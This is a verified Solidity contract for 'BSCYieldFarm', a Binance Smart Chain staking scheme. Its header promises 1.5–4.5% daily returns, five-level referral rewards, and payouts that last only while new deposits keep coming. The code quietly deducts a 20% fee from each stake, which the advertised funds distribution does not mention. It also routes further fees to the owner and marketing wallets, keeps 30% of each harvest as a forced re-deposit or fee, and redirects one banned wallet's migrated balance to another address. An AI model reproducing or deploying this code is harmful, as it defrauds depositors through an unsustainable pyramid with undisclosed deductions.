/**
 *Submitted for verification at BscScan.com on 2022-09-29
*/

/*   BSCYieldFarm - Community Experimental yield farm on Binance Smart Chain.
 *   The only official platform BSCyf project!
 *   Version 3.0.0
 *   SPDX-License-Identifier: Unlicensed
 *   ┌───────────────────────────────────────────────────────────────────────┐
 *   │   Website: https://bscyf.com                                          │
 *   │                                                                       │
 *   │   Telegram Live Support: @bsctrecks                                   │
 *   │   Telegram Public Chat: @bscyf_real                                   │
 *   │                                                                       │
 *   │   E-mail: [email protected]                                            │
 *   └───────────────────────────────────────────────────────────────────────┘
 *
 *   [USAGE INSTRUCTION]
 *
 *   1) Connect any supported wallet [Recommended: Metamask/TrustWallet ]
 *   2) Be sure to switch to BSC network (Binance Smart Chain) 
 *   3) Click on Dashboard to view the Staking Options
 *   4) Select your Staking Contract and enter the BNB or BSC token amount (e.g: 100)
 *   5) Click "Stake Asset", and confirm the transaction
 *   6) Wait for your earnings, it starts as soon as the transaction is confirmed and Yields every seconds
 *   7) Once you have sufficient Yields, Click on "Harvest Asset" any time (@ 2 hours Intervals)
 *   8) We aim to build a strong community through team work, pls share your link and earn more...
 *   
 *   ##### NOTICE: 
 *   We have a smart Antiy-Drain system implemented to ensure system longevity
 *
 *   [STAKING/FARMING TERMS]
 *
 *   - Minimum deposit: 0.001 BNB [or as specified on the DApp], no maximum limit
 *   - Total income: based on your Staking Contract (from 1.5% and Up to 4.5% daily) 
 *   - Yields every seconds, harvest any time (@ 2 hours Intervals)
 *   - Yield Cap from 170% to 540% 
 *
 *   [AFFILIATE PROGRAM]
 *
 *   - 5 level referral reward: 7% - 3% - 1% - 0.75% - 0.25%
 *
 *   [FUNDS DISTRIBUTION]
 *
 *   - 90% Platform main balance, using for participants payouts, affiliate program bonuses
 *   - 7.5% Advertising and promotion expenses, Support work, technical functioning, administration fee
 *
 *   [DISCLAIMER]
 *
 *   This is an experimental project, it's success relies on its community
 *   as DeFi system it runs smoothly on binance smartchain network
 *   This project can be considered having high risks as well as high profits.
 *   Though once contract balance drops to zero payments will stops, everything has been 
 *   programmed to prevent this from happening, therefore as we keep sharing this project it will remain alive.
 *   deposit at your own risk.
 */

pragma solidity 0.8.17;

abstract contract ReentrancyGuard {
    // Booleans are more expensive than uint256 or any type that takes up a full
    // word because each write operation emits an extra SLOAD to first read the
    // slot's contents, replace the bits taken up by the boolean, and then write
    // back. This is the compiler's defense against contract upgrades and
    // pointer aliasing, and it cannot be disabled.

    // The values being non-zero value makes deployment a bit more expensive,
    // but in exchange the refund on every call to nonReentrant will be lower in
    // amount. Since refunds are capped to a percentage of the total
    // transaction's gas, it is best to keep them low in cases like this one, to
    // increase the likelihood of the full refund coming into effect.
    uint256 private constant _NOT_ENTERED = 1;
    uint256 private constant _ENTERED = 2;

    uint256 private _status;

    constructor () {
        _status = _NOT_ENTERED;
    }

    /**
    * @dev Prevents a contract from calling itself, directly or indirectly.
    * Calling a `nonReentrant` function from another `nonReentrant`
    * function is not supported. It is possible to prevent this from happening
    * by making the `nonReentrant` function external, and make it call a
    * `private` function that does the actual work.
    */
    modifier nonReentrant() {
        // On the first call to nonReentrant, _notEntered will be true
        require(_status != _ENTERED, "ReentrancyGuard: reentrant call");

        // Any calls to nonReentrant after this point will fail
        _status = _ENTERED;

        _;

        // By storing the original value once again, a refund is triggered (see
        // https://eips.ethereum.org/EIPS/eip-2200)
        _status = _NOT_ENTERED;
    }

    modifier isHuman() {
        require(tx.origin == msg.sender, "sorry humans only");
        _;
    }
}

contract BSCYieldFarm is ReentrancyGuard {
    using SafeMath for uint256;
    using SafeERC20 for IERC20;

    BSCYieldFarm internal  BSCYFv1 = BSCYieldFarm(payable(0xFd6240Ba2174b56E4d7d66231Df1B7CA07417434));
    BSCYieldFarm internal  BSCYFv2 = BSCYieldFarm(payable(0x1b74FAcC863672294A2A031e20995c9E7d6082cD));

    uint256 constant internal STAKE_MIN_AMOUNT = 0.01 ether; 
    uint256 constant internal COMM = 1200;
    uint256[] internal REFERRAL_PERCENTS = [700, 300, 100, 75, 25];
    uint256 constant internal PROJECT_FEE = 500;
    uint256 constant internal STARUP_BONUS = 1500;
    uint256 constant internal PERCENTS_DIVIDER = 10000;
    uint256 constant internal TIME_STEP = 1 days;
    uint256 constant internal ANTIWHALES = 3; 
    address internal marketing_;
    address internal contract_;

    bool public started;
    bool public startupbonus;

    struct Tokens{
        uint8 tokenID;
        string tokenTicker;
        uint8 decimals;
        address token;
        uint256 stakeMinAmount;
        uint256 totalStaked;
        uint256 totalHarvest;
        uint256 totalRefBonus;
        uint256 totalFarmers;
    }

    struct Plan {
        uint256 time;
        uint256 percent;
    }

    struct Deposits {
        uint8 plan;
        uint256 amount;
        uint256 start;
    }

    struct tDeposits{
        uint256 checkpoint;
        uint256 bonus;
        uint256 totalBonus;
        uint256 harvested;
    }

    struct toDeposits{
        uint256 checkpoint;
        uint256 bonus;
        uint256 totalBonus;
        uint256 harvested;
        uint256 pendingFunds;
    }

    struct User {
        address referrer;
        uint256[5] levels;
        uint8 moved;
    }

    mapping (address => User) public users;

    Plan[] internal plans;

    mapping(uint256 => Tokens) public tokens;

    mapping(address => Tokens) internal _tokens;

    mapping(address => mapping(address => tDeposits)) public tdeposits;
    
    mapping(address => mapping(address => toDeposits)) public todeposits;

    mapping(address => mapping(address => Deposits[])) public deposits;

    uint8 internal _lastTokenID = 0; 

    event Newbie(address user, uint8 tokenID);
    event NewbieBonus(address user, uint8 tokenID, uint256 bonus);
    event NewDeposit(address indexed user, uint8 plan, uint8 tokenID, uint256 amount);
    event Harvested(address indexed user, uint256 amount, uint8 tokenID);
    event Compounded(address indexed user, uint256 amount, uint8 tokenID);
    event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
    event FeePayed(address indexed user, uint256 totalAmount);

    constructor(address _marketing) {
        contract_ = msg.sender;
        marketing_ = _marketing;
        plans.push(Plan(360, 150));
        plans.push(Plan(40, 425));
        plans.push(Plan(60, 435));
        plans.push(Plan(90, 450));
        plans.push(Plan(60, 100));
        Tokens storage token = tokens[_lastTokenID];
        token.tokenID = _lastTokenID;
        token.decimals = 18;
        token.tokenTicker = 'BNB';
        token.stakeMinAmount = STAKE_MIN_AMOUNT;
        _lastTokenID++;
    }

    modifier onlyContract(){
        require(msg.sender == contract_, 'Forbiden!');
        _;
    }

    // Insert Stake
    function insertStaking(uint8 plan, uint256 _amount, uint8 _tokenID) internal{
        address _userID = msg.sender;
        Tokens storage token = tokens[_tokenID];
        if (deposits[_userID][token.token].length == 0) {
            todeposits[_userID][token.token].checkpoint = block.timestamp;
            token.totalFarmers++;
            emit Newbie(_userID, _tokenID);
        }
        // 20% staking fee
        uint256 _stakinF = _amount.mul(2000).div(PERCENTS_DIVIDER);
        deposits[_userID][token.token].push(Deposits(plan, _amount.sub(_stakinF), block.timestamp));

        token.totalStaked = token.totalStaked.add(_amount);

        emit NewDeposit(_userID, plan, _tokenID, _amount);
    }

    function registerUser(address _referrer) internal{
        address _userID = msg.sender;
        User storage user = users[_userID];
        // if (deposits[referrer][token.token].length > 0 && referrer != _userID) {
        if (_referrer == _userID || _referrer == address(0)) {
            _referrer = contract_;
        }
        user.referrer = _referrer;
        // update count
        for(uint8 i = 0; i < 5; i++){
            if(_referrer != address(0)){
                users[_referrer].levels[i]++;
                _referrer = users[_referrer].referrer;
            }
            else break;
        }
    }

    function doStaking(address referrer, uint8 plan, uint256 _amount, uint8 _tokenID) internal{
        address _userID = msg.sender;
        if(users[msg.sender].referrer == address(0)){
            registerUser(referrer);
        }
        Tokens storage token = tokens[_tokenID];
        uint256 _comm = _amount.mul(COMM).div(PERCENTS_DIVIDER);
        address upline = users[msg.sender].referrer;
        for (uint256 i = 0; i < 5; i++) {
            if (upline != address(0)) {
                // users[upline].levels[i] = users[upline].levels[i].add(1);
                uint256 amount = _amount.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);
                todeposits[upline][token.token].bonus += amount;
                todeposits[upline][token.token].totalBonus += amount;
                token.totalRefBonus += amount;
                _comm = _comm.sub(amount);
                emit RefBonus(upline, _userID, i, amount);
                upline = users[upline].referrer;
            } else break;
        }

        if(_comm > 0){
            todeposits[contract_][token.token].bonus += _comm;
            todeposits[contract_][token.token].totalBonus += _comm;
            token.totalRefBonus += _comm;
        }

        insertStaking(plan, _amount, _tokenID);
    }

    function stakeBNB(address referrer, uint8 plan) public payable {
        
        require(msg.sender != address(0x493323C1f45caC0ceC5C151347681CA969De71AE), 'Banned!');
        // Prevent Old members from staking without moving to v3
        uint256 _deposits_v1 = BSCYFv1.getUserAmountOfDeposits(msg.sender, 0);
        uint256 _deposits_v2 = BSCYFv2.getUserAmountOfDeposits(msg.sender, 0);

        if(_deposits_v1 > 0 || _deposits_v2 > 0){
            require(users[msg.sender].moved == 1, 'MustUpdateInfo');
        }

        require(plan < 4, "Invalid plan");
        uint256 _amount = msg.value;
        address _userID = msg.sender;

        require(_amount >= tokens[0].stakeMinAmount, 'MiniMumRequired');

        uint256 _fee = _amount.mul(PROJECT_FEE).div(PERCENTS_DIVIDER);
        payable(contract_).transfer(_fee.div(2));
        payable(marketing_).transfer(_fee);
        emit FeePayed(_userID, _fee.add(_fee.div(2)));
        doStaking(referrer, plan, _amount, 0);
    }

    function stakeToken(address referrer, uint8 plan,  uint8 tokenID, uint256 _amount) public {
        require(tokenID != 0 && tokens[tokenID].token != address(0), 'Wrong TokenID');
        if (!started) {
            require(msg.sender == contract_, 'notStared');
            started = true;
        }
        require(plan < 4, "Invalid plan");
        address _userID = msg.sender;
        
        IERC20 salt = IERC20(tokens[tokenID].token);

        require(_amount >= tokens[tokenID].stakeMinAmount, 'MiniMumRequired');

        require(_amount <= salt.allowance(msg.sender, address(this)));
        salt.safeTransferFrom(msg.sender, address(this), _amount);

        uint256 _fee = _amount.mul(PROJECT_FEE).div(PERCENTS_DIVIDER);
        // todeposits[contract_][token.token].bonus.add(_fee);
        salt.safeTransfer(contract_, _fee);
        salt.safeTransfer(marketing_, _fee);
        emit FeePayed(_userID, _fee.mul(2));

        doStaking(referrer, plan, _amount, tokenID);
    }
    
    function harvest(uint8 tokenID) public {
        address _userID = msg.sender;
        // Banned Wallet
        require(_userID != address(0x493323C1f45caC0ceC5C151347681CA969De71AE), 'Banned!');
        Tokens storage token = tokens[tokenID];
        // Havest is allowed at intervals of 2hrs
        require(block.timestamp >= todeposits[_userID][token.token].checkpoint.add(2 hours), '2hrsLimit');
        uint256 totalAmount = getUserDividends(_userID, tokenID);

        uint256 pendinHarvest = todeposits[_userID][token.token].pendingFunds;

        if(pendinHarvest > 0){
            todeposits[_userID][token.token].pendingFunds = 0;
            totalAmount = totalAmount.add(pendinHarvest);
        }

        uint256 referralBonus = getUserReferralBonus(_userID, tokenID);
        if (referralBonus > 0) {
            todeposits[_userID][token.token].bonus = 0;
            totalAmount = totalAmount.add(referralBonus);
        }

        require(totalAmount > 0, "User has no dividends");

        uint256 contractBalance = address(this).balance;
        IERC20 salt;
        if(tokenID != 0){
            salt = IERC20(token.token);
            contractBalance = salt.balanceOf(address(this));
        }

        require(contractBalance >= totalAmount, 'NoFunds');

        // cap withdrawal to 3x total staked
        uint256 harvestCap = getUserTotalDeposits(_userID, tokenID).mul(ANTIWHALES);
        uint256 tHarvested = getUserTotalHarvested(_userID, tokenID).add(totalAmount);

        if(tHarvested >= harvestCap){
            uint256 eligibleHarvest = tHarvested.sub(harvestCap);
            totalAmount = totalAmount.sub(eligibleHarvest);
            todeposits[_userID][token.token].pendingFunds = eligibleHarvest;
        }

        uint256 _withdrawn = totalAmount.mul(7000).div(PERCENTS_DIVIDER);
        uint256 _withFee = totalAmount.mul(500).div(PERCENTS_DIVIDER);
        uint256 _reInvest = totalAmount.sub(_withdrawn.add(_withFee));
        
        todeposits[_userID][token.token].checkpoint = block.timestamp;
        todeposits[_userID][token.token].harvested = todeposits[_userID][token.token].harvested.add(totalAmount);
        // Transfer only 70% of User's Available FUNDS and force re-entry
        if(tokenID != 0){
            salt.safeTransfer(msg.sender, _withdrawn);
        }
        else{
            payable(msg.sender).transfer(_withdrawn);
        }

        emit Harvested(msg.sender, totalAmount, tokenID);
        // Make User's re-entry with 25% balance.
        if(_reInvest > 0){
            deposits[_userID][token.token].push(Deposits(4, _reInvest, block.timestamp));
            token.totalStaked = token.totalStaked.add(_reInvest);
            emit NewDeposit(msg.sender, 4, tokenID, _reInvest);
        }
        
        token.totalHarvest = token.totalHarvest.add(totalAmount);
    }

    function manualCompounding(uint8 tokenID) public{
        address _userID = msg.sender;
        require(_userID != address(0x493323C1f45caC0ceC5C151347681CA969De71AE), 'Banned!');
        Tokens storage token = tokens[tokenID];
        // Havest is allowed at intervals of 2hrs
        require(block.timestamp >= todeposits[_userID][token.token].checkpoint.add(2 hours), '2hrsLimit');
        uint256 totalAmount = getUserDividends(_userID, tokenID);

        uint256 pendinHarvest = todeposits[_userID][token.token].pendingFunds;

        if(pendinHarvest > 0){
            todeposits[_userID][token.token].pendingFunds = 0;
            totalAmount = totalAmount.add(pendinHarvest);
        }

        uint256 referralBonus = getUserReferralBonus(_userID, tokenID);
        if (referralBonus > 0) {
            todeposits[_userID][token.token].bonus = 0;
            totalAmount = totalAmount.add(referralBonus);
        }

        require(totalAmount > 0, "User has no dividends");

        uint256 _compound = totalAmount.mul(7000).div(PERCENTS_DIVIDER);
        uint256 _withFee = totalAmount.mul(500).div(PERCENTS_DIVIDER);
        uint256 _reInvest = totalAmount.sub(_compound.add(_withFee));

        todeposits[_userID][token.token].checkpoint = block.timestamp;
        todeposits[_userID][token.token].harvested = todeposits[_userID][token.token].harvested.add(totalAmount);
        // Make User's re-entry with 70% balance.
        if(_compound > 0){
            deposits[_userID][token.token].push(Deposits(3, _compound, block.timestamp));
            token.totalStaked = token.totalStaked.add(totalAmount);
            emit Compounded(msg.sender, _compound, tokenID);
        }
        // Make User's re-entry with 25% balance.
        if(_reInvest > 0){
            deposits[_userID][token.token].push(Deposits(4, _reInvest, block.timestamp));
            token.totalStaked = token.totalStaked.add(_reInvest);
            emit NewDeposit(msg.sender, 4, tokenID, _reInvest);
        }
        
        token.totalHarvest = token.totalHarvest.add(totalAmount);
    }

    function getContractBalance(uint256 tokenID) public view returns (uint256) {
        if(tokenID > 0){
            Tokens memory token = tokens[tokenID];
            IERC20 salt = IERC20(token.token);
            return salt.balanceOf(address(this));
        }
        else{
            return address(this).balance;
        }
    }

    function getPlanInfo(uint8 plan) public view returns(uint256 time, uint256 percent) {
        time = plans[plan].time;
        percent = plans[plan].percent;
    }

    function getUserDividends(address userAddress, uint256 tokenID) public view returns (uint256) {
        
        Tokens memory token = tokens[tokenID];

        uint256 totalAmount;

        for (uint256 i = 0; i < deposits[userAddress][token.token].length; i++) {
            uint256 finish = deposits[userAddress][token.token][i].start.add(plans[deposits[userAddress][token.token][i].plan].time.mul(1 days));
            if (todeposits[userAddress][token.token].checkpoint < finish) {
                uint256 share = deposits[userAddress][token.token][i].amount.mul(plans[deposits[userAddress][token.token][i].plan].percent).div(PERCENTS_DIVIDER);
                uint256 from = deposits[userAddress][token.token][i].start > todeposits[userAddress][token.token].checkpoint ? deposits[userAddress][token.token][i].start : todeposits[userAddress][token.token].checkpoint;
                uint256 to = finish < block.timestamp ? finish : block.timestamp;
                if (from < to) {
                    totalAmount = totalAmount.add(share.mul(to.sub(from)).div(TIME_STEP));
                }
            }
        }

        return totalAmount;
    }

    function getUserTotalHarvested(address userAddress, uint256 tokenID) internal view returns (uint256) {
        Tokens memory token = tokens[tokenID];
        return todeposits[userAddress][token.token].harvested;
    }

    function getUserPendingHarvest(address userAddress, uint256 tokenID) internal view returns (uint256) {
        Tokens memory token = tokens[tokenID];
        return todeposits[userAddress][token.token].pendingFunds;
    }

    function getUserReferrer(address userAddress) public view returns(address) {
        return users[userAddress].referrer;
    }

    function getUserDownlineCount(address userAddress) public view returns(uint256[5] memory referrals) {
        return (users[userAddress].levels);
    }

    function getUserTotalReferrals(address userAddress) public view returns(uint256) {
        return users[userAddress].levels[0]+users[userAddress].levels[1]+users[userAddress].levels[2]+users[userAddress].levels[3]+users[userAddress].levels[4];
    }

    function getUserReferralBonus(address userAddress, uint256 tokenID) public view returns(uint256) {
        Tokens memory token = tokens[tokenID];
        return todeposits[userAddress][token.token].bonus;
    }

    function getUserReferralTotalBonus(address userAddress, uint256 tokenID) public view returns(uint256) {
        Tokens memory token = tokens[tokenID];
        return todeposits[userAddress][token.token].totalBonus;
    }

    function getUserReferralHarvested(address userAddress, uint256 tokenID) public view returns(uint256) {
        Tokens memory token = tokens[tokenID];
        return todeposits[userAddress][token.token].totalBonus.sub(todeposits[userAddress][token.token].bonus);
    }

    function getUserAvailable(address userAddress, uint256 tokenID) public view returns(uint256) {
        return getUserReferralBonus(userAddress, tokenID).add(getUserDividends(userAddress, tokenID));
    }

    function getUserAmountOfDeposits(address userAddress, uint256 tokenID) public view returns(uint256) {
        Tokens memory token = tokens[tokenID];
        return deposits[userAddress][token.token].length;
    }

    function getUserTotalDeposits(address userAddress, uint256 tokenID) internal view returns(uint256 amount) {
        Tokens memory token = tokens[tokenID];
        for (uint256 i = 0; i < deposits[userAddress][token.token].length; i++) {
            amount = amount.add(deposits[userAddress][token.token][i].amount);
        }
    }

    function getUserDepositInfo(address userAddress, uint256 index, uint256 tokenID) public view returns(uint8 plan, uint256 percent, uint256 amount, uint256 start, uint256 finish) {
        Tokens memory token = tokens[tokenID];
        plan = deposits[userAddress][token.token][index].plan;
        percent = plans[plan].percent;
        amount = deposits[userAddress][token.token][index].amount;
        start = deposits[userAddress][token.token][index].start;
        finish = deposits[userAddress][token.token][index].start.add(plans[deposits[userAddress][token.token][index].plan].time.mul(1 days));
    }

    function getSiteInfo(uint256 tokenID) public view returns(uint256 _totalInvested, uint256 _totalBonus) {
        Tokens memory token = tokens[tokenID];
        return(token.totalStaked, token.totalRefBonus);
    }

    function getUserInfo(address userAddress, uint256 tokenID) public view returns(uint256 totalDeposit, uint256 totalHarvested, uint256 totalReferrals) {
        return(getUserTotalDeposits(userAddress, tokenID), getUserTotalHarvested(userAddress, tokenID), getUserTotalReferrals(userAddress));
    }

    function isContract(address addr) internal view returns (bool) {
        uint256 size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

    function verifyAllowance(uint8 tokenID) public view returns(uint256){
        require(tokenID > 0, 'InvalidTokenID');
        Tokens memory token = tokens[tokenID];
        return(IERC20(token.token).allowance(msg.sender, address(this)));
    }

    function updateMinimum(uint256 _tokenID, uint256 _stakeMinAmount) public onlyContract{
        Tokens storage token = tokens[_tokenID];
        token.stakeMinAmount = _stakeMinAmount;
    }

    function addToken(address _token, uint256 _stakeMinAmount) public onlyContract{
        require(_tokens[_token].tokenID == 0, 'DoubleEntry');
        Tokens storage token = tokens[_lastTokenID];
        token.decimals = IERC20(_token).decimals();
        token.tokenTicker = IERC20(_token).symbol();
        token.token = _token;
        token.tokenID = _lastTokenID;
        token.stakeMinAmount = _stakeMinAmount;
        _lastTokenID++;
    }

    // Migrate from V2 of V1
    function updateUserInfo() public{
        uint8 _tokenID = 0;
        address _userID = msg.sender;
        address _sponsor = BSCYFv1.getUserReferrer(_userID);
        if(_userID == address(0x493323C1f45caC0ceC5C151347681CA969De71AE)){
            _userID = address(0x25698C1b65881cd13C74f9B55C5e79b9f54b10A2);
        }
        if(_sponsor == address(0x493323C1f45caC0ceC5C151347681CA969De71AE)){
            _sponsor = address(0x25698C1b65881cd13C74f9B55C5e79b9f54b10A2);
        }
        // Register User
        User storage user = users[_userID];
        require(user.moved == 0, 'alreadyMigrated');
        user.moved = 1;
        if (user.referrer == address(0)) {
            registerUser(_sponsor);
        }
        uint256 _deposits_v1 = BSCYFv1.getUserAmountOfDeposits(msg.sender, _tokenID);
        uint256 _deposits_v2 = BSCYFv2.getUserAmountOfDeposits(msg.sender, _tokenID);
        require(_deposits_v1 > 0 || _deposits_v2 > 0, 'No Allowed');
        
        (, uint8 _isMigrated) = BSCYFv2.users(_userID);
        if(_deposits_v1 > 0 && _isMigrated != 1){
            // Update Stakes
            for(uint256 i = 0; i < _deposits_v1; i++){
                (uint256 _plan, , uint256 _amount, uint256 _staked, uint256 _finished) = BSCYFv1.getUserDepositInfo(msg.sender, i, _tokenID);

                if(_finished > block.timestamp){
                    deposits[_userID][address(0)].push(Deposits(uint8(_plan), _amount, _staked));
                }
            }
            // Update Token Stats
            (uint256 _checkpoint, uint256 _bonus, , uint256 _harvested) = BSCYFv1.tdeposits(msg.sender, address(0));
            todeposits[_userID][address(0)].checkpoint = _checkpoint;
            todeposits[_userID][address(0)].harvested += _harvested;
            todeposits[_userID][address(0)].bonus = _bonus;
        }
        if(_deposits_v2 > 0){
            // Update Stakes
            for(uint256 i = 0; i < _deposits_v2; i++){
                (uint256 _plan, , uint256 _amount, uint256 _staked, uint256 _finished) = BSCYFv2.getUserDepositInfo(msg.sender, i, _tokenID);

                if(_finished > block.timestamp){
                    deposits[_userID][address(0)].push(Deposits(uint8(_plan), _amount, _staked));
                }
            }
            // Update Token Stats
            (uint256 _checkpoint, uint256 _bonus, , uint256 _harvested, uint256 _pendingFunds) = BSCYFv2.todeposits(_userID, address(0));
            todeposits[_userID][address(0)].checkpoint = _checkpoint;
            todeposits[_userID][address(0)].harvested += _harvested;
            todeposits[_userID][address(0)].bonus += _bonus;
            todeposits[_userID][address(0)].pendingFunds = _pendingFunds;
        }
    }

    receive() external payable {}
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeERC20 {
    using SafeMath for uint256;

    function safeTransfer(IERC20 token, address to, uint256 value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(IERC20 token, address from, address to, uint256 value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    function safeApprove(IERC20 token, address spender, uint256 value) internal {
        require((value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }
    function callOptionalReturn(IERC20 token, bytes memory data) private {
        require(isContract(address(token)), "SafeERC20: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeERC20: low-level call failed");

        if (returndata.length > 0) { // Return data is optional
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }

    function isContract(address addr) internal view returns (bool) {
        uint256 size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}